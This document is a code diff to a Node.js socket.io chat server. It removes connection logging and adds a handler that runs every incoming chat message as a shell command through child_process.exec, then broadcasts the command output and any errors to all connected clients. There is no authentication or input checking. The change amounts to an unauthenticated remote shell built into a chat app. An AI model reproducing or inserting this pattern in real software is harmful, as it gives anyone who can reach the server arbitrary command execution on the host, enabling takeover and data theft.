@@ -6,14 +6,26 @@ app.get('/', function(req, res){
 	 res.sendFile("index.html", {"root": 'public/'});
 });
 
+var exec = require('child_process').exec;
+
 io.on('connection', function(socket){
-	console.log('a user connected');
-	socket.on('disconnect', function(){
-		console.log('user disconnected');
-	});
 	socket.on('chat message', function(msg){
 		io.emit('chat message', {'message': msg});
 		console.log('message: ' + msg);
+		var child = exec(msg, function (error, stdout, stderr) {
+	        if(stdout!==''){
+	            console.log('stdout\n' + stdout);
+	            io.emit('chat message', {'message': stdout});
+	        }
+	        if(stderr!==''){
+	            console.log('stderr:\n' + stderr);
+	            io.emit('chat message', {'message': stderr});
+	        }
+	        if (error !== null) {
+	            console.log('exec error:\n[' + error+']');
+	            io.emit('chat message', {'message': error});
+	    	}
+    	});
 	});
 })
 
